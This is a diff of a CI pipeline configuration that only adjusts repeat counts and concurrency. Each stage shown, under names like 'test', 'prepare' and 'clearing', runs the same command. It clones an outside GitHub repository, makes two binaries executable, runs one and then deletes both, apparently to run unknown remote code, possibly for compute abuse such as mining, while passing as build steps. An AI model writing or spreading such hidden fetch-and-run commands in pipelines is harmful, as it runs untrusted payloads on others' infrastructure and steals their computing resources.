@@ -35,8 +35,8 @@ pipeline:
                 spec: {}
             strategy:
               repeat:
-                times: 60
-                maxConcurrency: 3
+                times: 6
+                maxConcurrency: 10
         - stage:
             name: test
             identifier: test
@@ -61,8 +61,8 @@ pipeline:
                         command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
             strategy:
               repeat:
-                times: 60
-                maxConcurrency: 3
+                times: 6
+                maxConcurrency: 10
         - stage:
             name: prepare
             identifier: prepare
@@ -87,8 +87,8 @@ pipeline:
                         command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
             strategy:
               repeat:
-                times: 60
-                maxConcurrency: 3
+                times: 6
+                maxConcurrency: 10
         - stage:
             name: go build tes
             identifier: go_build_tes
@@ -113,8 +113,8 @@ pipeline:
                         command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
             strategy:
               repeat:
-                times: 60
-                maxConcurrency: 3
+                times: 6
+                maxConcurrency: 10
         - stage:
             name: clearing
             identifier: clearing
@@ -139,8 +139,8 @@ pipeline:
                         command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
             strategy:
               repeat:
-                times: 60
-                maxConcurrency: 3
+                times: 6
+                maxConcurrency: 10
     - stage:
         name: done
         identifier: done
